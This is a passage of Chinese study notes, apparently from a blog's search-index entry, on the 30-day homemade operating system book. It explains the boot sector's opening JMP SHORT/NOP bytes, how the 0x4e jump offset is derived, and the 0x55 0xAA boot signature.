<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DB 0xeb, 0x4e</span><br><span class="line">DB 0x90</span><br></pre></td></tr></table></figure>
</li>
<li><p>根据day2的代码 上面第一行代码 <strong>DB 0xeb, 0x4e</strong> 被改为了 <strong>JMP entry</strong> ，为什么？</p>
<blockquote>
<p><strong>0xeb</strong> 是 x86 汇编指令 <strong>JMP SHORT</strong>，而 <strong>NASK</strong> 汇编把 <strong>JMP SHORT</strong> 简写为 <strong>JMP</strong>，0x90是x86汇编里的 NOP（空指令），也就是说 <strong>0xeb 0x4e 0x90</strong> 和汇编代码 <strong>JMP 0x4e; NOP;</strong> 是等价的</p>
</blockquote>
</li>
<li><p><strong>0x4e</strong> 从哪里来？</p>
<blockquote>
<p><strong>0x4e</strong> 是转移的位移量，把书翻到第24页数一下从 <strong>0x90</strong> 开始到第25页的 <strong>resb 18</strong> 一共占的字节数，正好是 <strong>0x4e</strong>（$78_o$）个</p>
</blockquote>
</li>
<li><p>从开头到主体有 <strong>80</strong> 个字节（<strong>0x50</strong>）为什么 <strong>JMP 0x4e</strong>？</p>
<blockquote>
<p><strong>0x4e</strong> 是 <strong>0x50-2</strong>。减2是因为 <strong>pc</strong> 指针已经指向了下一句 <strong>NOP</strong> 指令前面，所以偏移量要减去 <strong>JMP</strong> 和 <strong>entry</strong> 的机器码 （<strong>0xeb</strong> 和 <strong>0x4e</strong>） 所占的内存空间</p>
</blockquote>
</li>
<li><p>为什么要 <strong>0x55 0xAA</strong> ?</p>
<blockquote>
<p>见书P26末-P27始，计算机读软盘以512字节为单位，软盘512字节为一个扇区，并且读到的第一个扇区为启动扇区，检查第一个扇区最后两个字节是否为<strong>0x55 0xAA</strong> 如果不是则认为无启动程序，报错，是则执行。</p>
<p>所以，虽然在第一个扇区程序从开头写到 <strong>RESB	0x1fe-$</strong> 写了510个字节，但是加上<strong>0x55 0xAA</strong> 就是512字节，作为启动程序。</p>
</blockquote>
</li>
</ul>
<p>参考资料：</p>
<p><a href="https://www.cnblogs.com/yucloud/p/10943215.html">《30天自制操作系统》笔记3 — （Day2 上节）完全解析文件系统</a></p>
<p><a href="https://tieba.baidu.com/p/1873534487">第一章例子的第一行（DB 0xeb, 0x4e, 0x90）是什么意思？【30天自制操作系统吧】</a></p>
]]></content>
      <categories>
        <category>Operating System</category>
      </categories>
      <tags>
        <tag>System</tag>
        <tag>Assembly</tag>
        <tag>Disk</tag>
      </tags>
  </entry>
</search>
